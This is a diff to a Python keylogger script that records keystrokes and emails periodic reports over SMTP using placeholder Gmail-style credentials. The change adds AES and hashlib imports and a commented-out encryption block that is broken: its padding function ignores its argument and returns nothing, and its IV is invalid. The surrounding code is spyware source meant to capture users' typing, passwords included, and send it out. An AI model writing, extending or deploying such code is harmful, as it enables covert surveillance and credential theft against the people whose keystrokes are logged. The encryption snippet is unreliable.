@@ -6,6 +6,9 @@ import smtplib  # For sending email using SMTP protocol (gmail).
 from threading import Timer
 from datetime import datetime
 
+from Crypto.Cipher import AES
+import hashlib 
+
 SEND_REPORT_EVERY = 60 # (60 = 1min) / time between reports, change according to your preference
 EMAIL_ADDRESS = 'exemple@notsafe.com'
 EMAIL_PASSWORD = 'notsosafe'
@@ -100,6 +103,28 @@ class keylogger:
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
 
+##### Enrypt ######
+
+"""
+password = ''.encode()    
+key = ''
+mode = AES.MODE_CBC
+IV = 'IV456'
+
+def pad_message():
+    while len(message)% 16 != 0:
+        message = message + ' '
+    return
+
+cipher = AES.new(key, mode, IV)
+
+message = ''
+padded_message = pad_message(message)
+
+encrypt = cipher.encrypt(padded_message)
+print(encrypt)
+
+"""
 
 if __name__ == '__main__':
 
